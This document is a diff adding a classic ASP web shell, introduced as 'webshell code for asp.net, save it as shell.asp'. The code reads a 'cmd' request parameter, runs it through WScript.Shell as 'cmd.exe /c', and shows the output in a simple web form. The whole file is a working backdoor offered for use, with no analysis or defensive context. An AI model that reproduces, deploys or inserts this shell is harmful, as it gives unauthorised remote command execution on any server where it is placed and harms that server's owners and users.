@@ -1,0 +1,39 @@
+Webshell code for asp.net, save it as shell.asp
+------------------------------------------------------------------------------------------------------------------------------------------------
+<%
+' Robust ASP command shell
+On Error Resume Next
+
+dim cmd, shell, exec, output
+cmd = Request("cmd")
+
+Set shell = Server.CreateObject("WScript.Shell")
+
+If Not shell Is Nothing And cmd <> "" Then
+    Set exec = shell.Exec("cmd.exe /c " & cmd)
+    If Not exec Is Nothing Then
+        output = ""
+        Do While Not exec.StdOut.AtEndOfStream
+            output = output & exec.StdOut.ReadLine() & vbCrLf
+        Loop
+    Else
+        output = "Error: Unable to execute command."
+    End If
+ElseIf shell Is Nothing Then
+    output = "Error: WScript.Shell not available on this server."
+Else
+    output = ""
+End If
+%>
+<html>
+<body>
+<form method="GET">
+<input type="text" name="cmd" size="60" value="<%=Server.HTMLEncode(cmd)%>">
+<input type="submit" value="Run">
+</form>
+<pre>
+<%=Server.HTMLEncode(output)%>
+</pre>
+</body>
+</html>
+------------------------------------------------------------------------------------------------------------------------------------------------
